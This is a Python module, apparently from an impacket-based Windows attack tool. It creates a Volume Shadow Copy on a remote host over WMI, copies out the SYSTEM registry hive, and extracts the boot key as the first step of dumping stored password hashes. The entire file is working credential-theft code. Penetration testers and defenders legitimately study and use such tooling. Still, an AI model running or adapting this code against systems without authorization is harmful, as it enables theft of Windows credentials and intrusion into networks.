from binascii import hexlify

from impacket.examples.secretsdump import LocalOperations

class RemoteOperations:
    def __init__(self, context, shadow_id:str = None):
        self.context = context

        self.cimv2_namespace = self.context.get_namespace("//./root/cimv2")
        
        # Cached variables
        self.bootkey = None
        if shadow_id is not None:
            self.context.logger.display(f"Using existing VSS Snapshot ID: {shadow_id}")
        self._shadow_id = shadow_id
        self._shadow_copy_path = None

        # Keep track if we created a Shadow Copy to delete it later
        self.shadow_copy_created = False

    def __del__(self):
        # If we created a Shadow Copy, delete it
        if self.shadow_copy_created:
            wmiPath = f'Win32_ShadowCopy.ID="{self.shadow_id}"'
            self.context.logger.debug(f"Trying to delete ShadowCopy with ID {self.shadow_id}")
            ret = self.cimv2_namespace.DeleteInstance(wmiPath)
            if (ret.GetCallStatus(0) & 0xffffffff) != 0:
                self.context.logger.fail(f"Could not delete ShadowCopy ID {self.shadow_id}. You will need to delete this by yourself.")
            else:
                self.context.logger.debug(f"ShadowCopy with ID {self.shadow_id} successfully deleted")

    def create_shadowcopy(self) -> str:
        # Creating Shadow Volumes
        shadow_id = None
        try:
            win32_shadow_copy, _ = self.cimv2_namespace.GetObject("Win32_ShadowCopy")
            self.context.logger.debug("Trying to create SS remotely via WMI")
            result = win32_shadow_copy.Create("C:\\", "ClientAccessible")
            self.shadow_copy_created = True
            shadow_id = result.ShadowID
            self.context.logger.debug(f"Shadow Copy created at ID {shadow_id}")
        except Exception as e:
            self.context.logger.debug(f"Cannot create ShadowCopy: {e}")
        return shadow_id

    def get_shadowcopy_path(self, shadow_id: str = None) -> str:
        if shadow_id is None:
            shadow_id = self.shadow_id
        device_object = None
        try:
            iEnum_shadow_copies = self.cimv2_namespace.ExecQuery(f'SELECT DeviceObject FROM Win32_ShadowCopy WHERE ID = "{shadow_id}"')
            obj = iEnum_shadow_copies.Next(0xffffffff, 1)[0]
            props = obj.getProperties()
            shadow_copy = {k: v["value"] for k, v in props.items()}
            device_object = shadow_copy['DeviceObject']
            self.context.logger.debug(f"Found ShadowCopy at {device_object}")
        except Exception as e:
            self.context.logger.debug(f"Cannot found ShadowCopy with ID {shadow_id} :{e}")
        return device_object

    @property
    def shadow_id(self):
        if self._shadow_id is None:
            self._shadow_id = self.create_shadowcopy()
        return self._shadow_id

    @property
    def shadow_copy_path(self):
        if self._shadow_copy_path is None:
            self._shadow_copy_path = self.get_shadowcopy_path()
        return self._shadow_copy_path

    def get_bootkey(self, output_filename):
        if self.bootkey is not None:
            return self.bootkey

        system_hive_path = f"{self.shadow_copy_path}\\Windows\\System32\\config\\SYSTEM"
        system_hive_recovered = self.context.get_file_single(system_hive_path, f"{output_filename}.system")
        if system_hive_recovered:
            self.context.logger.debug("Got SYSTEM hive")
            local_operations = LocalOperations(f"{output_filename}.system")
            self.bootkey = local_operations.getBootKey()
            self.context.logger.debug(f"Got bootkey: 0x{hexlify(self.bootkey).decode('utf-8')}")
        else:
            self.context.logger.fail("Could not get bootkey")
        return self.bootkey